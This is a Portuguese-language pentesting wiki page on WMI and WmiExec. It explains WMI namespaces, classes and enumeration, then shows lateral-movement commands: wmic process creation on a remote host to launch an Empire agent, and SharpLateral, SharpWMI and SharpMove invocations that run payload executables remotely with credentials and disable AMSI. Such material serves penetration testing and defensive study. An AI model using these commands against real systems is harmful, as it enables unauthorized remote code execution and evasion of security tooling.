# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Explicação de Como Funciona

Processos podem ser abertos em hosts onde o nome de usuário e a senha ou o hash são conhecidos por meio do uso do WMI. Os comandos são executados usando WMI pelo Wmiexec, proporcionando uma experiência de shell semi-interativa.

**dcomexec.py:** Usando diferentes endpoints DCOM, este script oferece um shell semi-interativo semelhante ao `wmiexec.py`. O valor `-object` selecionado escolhe o endpoint; os objetos compatíveis incluem `MMC20.Application`, `ShellWindows` e `ShellBrowserWindow`, sendo que este último fornece a técnica Shell Browser Window destacada no walkthrough original.<sup>[[2]](#references)[[3]](#references)</sup>

## Fundamentos do WMI

### Namespace

Estruturado em uma hierarquia no estilo de diretórios, o contêiner de nível superior do WMI é \root, sob o qual diretórios adicionais, chamados namespaces, são organizados.<sup>[[1]](#references)</sup>
Comandos para listar namespaces:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Classes dentro de um namespace podem ser listadas usando:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Classes**

Conhecer o nome de uma classe WMI, como win32_process, e o namespace em que ela reside é crucial para qualquer operação WMI.  
Comandos para listar classes que começam com `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Invocação de uma classe:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Métodos

Métodos, que são uma ou mais funções executáveis de classes WMI, podem ser executados.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Enumeração do WMI

### Status do serviço WMI

Comandos para verificar se o serviço WMI está operacional:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Informações do sistema e dos processos

Coleta de informações do sistema e dos processos por meio do WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Para atacantes, o WMI é uma ferramenta poderosa para enumerar dados confidenciais sobre sistemas ou domínios.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
A consulta remota do WMI para obter informações específicas, como administradores locais ou usuários conectados, é viável com uma construção cuidadosa dos comandos.

### **Consulta Manual Remota do WMI**

A identificação discreta de administradores locais em uma máquina remota e de usuários conectados pode ser realizada por meio de consultas WMI específicas. O `wmic` também permite ler um arquivo de texto para executar comandos em vários nós simultaneamente.<sup>[[1]](#references)</sup>

Para executar remotamente um processo por meio do WMI, como implantar um agente do Empire, utiliza-se a seguinte estrutura de comando, com a execução bem-sucedida indicada por um valor de retorno igual a "0":<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Este processo ilustra a capacidade do WMI para execução remota e enumeração de sistemas, destacando sua utilidade tanto para administração de sistemas quanto para pentesting.

## Automatic Tools

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Você também pode usar o **`wmiexec` do Impacket**.


## References

- [1] [Usando Credenciais para Dominar Máquinas Windows - Parte 3 (WMI e WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Guia para Iniciantes do Kit de Ferramentas Impacket, Parte 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
